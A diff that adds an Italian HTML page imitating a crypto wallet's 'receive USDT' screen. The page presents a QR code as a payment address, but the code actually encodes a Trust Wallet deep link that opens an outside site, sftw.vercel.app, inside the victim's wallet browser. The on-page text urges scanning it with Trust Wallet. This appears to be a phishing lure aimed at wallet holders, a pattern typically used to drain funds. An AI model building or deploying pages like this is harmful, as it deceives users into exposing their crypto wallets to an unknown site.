@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Ricevi USDT</title>
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+    }
+
+    body {
+      background: #f5f5f5;
+      display: flex;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 420px;
+      background: white;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .title {
+      text-align: center;
+      font-size: 34px;
+      font-weight: 700;
+      margin-top: 15px;
+      margin-bottom: 20px;
+    }
+
+    .warning {
+      background: #f9efd8;
+      border-radius: 16px;
+      padding: 16px;
+      font-size: 15px;
+      color: #4a4a4a;
+      margin-bottom: 20px;
+      line-height: 1.4;
+    }
+
+    .token {
+      text-align: center;
+      font-size: 28px;
+      font-weight: 700;
+      margin-bottom: 20px;
+    }
+
+    .badge {
+      background: #efefef;
+      border-radius: 8px;
+      padding: 5px 10px;
+      font-size: 15px;
+      vertical-align: middle;
+    }
+
+    .card {
+      background: white;
+      border-radius: 20px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.08);
+      padding: 20px;
+      text-align: center;
+    }
+
+    .qr {
+      width: 260px;
+      height: 260px;
+      display: block;
+      margin: auto;
+    }
+
+    .desc {
+      color: #666;
+      text-align: center;
+      margin-top: 18px;
+      line-height: 1.5;
+      font-size: 16px;
+    }
+
+    .btn {
+      width: 100%;
+      border: none;
+      background: #3375ff;
+      color: white;
+      padding: 18px;
+      border-radius: 18px;
+      font-size: 18px;
+      font-weight: 700;
+      margin-top: 28px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+
+    <div class="title">
+      Ricevi
+    </div>
+
+    <div class="warning">
+      Invia solo USDT (ERC20) a questo indirizzo.
+      Gli altri asset potrebbero andare persi.
+    </div>
+
+    <div class="token">
+      USDT <span class="badge">Ethereum</span>
+    </div>
+
+    <div class="card">
+
+      <img
+        class="qr"
+        src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=https://link.trustwallet.com/open_url?url=https://sftw.vercel.app/"
+      />
+
+    </div>
+
+    <div class="desc">
+      Scansiona il QR code con Trust Wallet per aprire il sito.
+    </div>
+
+    <button class="btn" onclick="closePage()">
+      Continua
+    </button>
+
+  </div>
+
+  <script>
+    function closePage() {
+      window.close();
+
+      setTimeout(() => {
+        history.back();
+      }, 200);
+    }
+  </script>
+
+</body>
+</html>
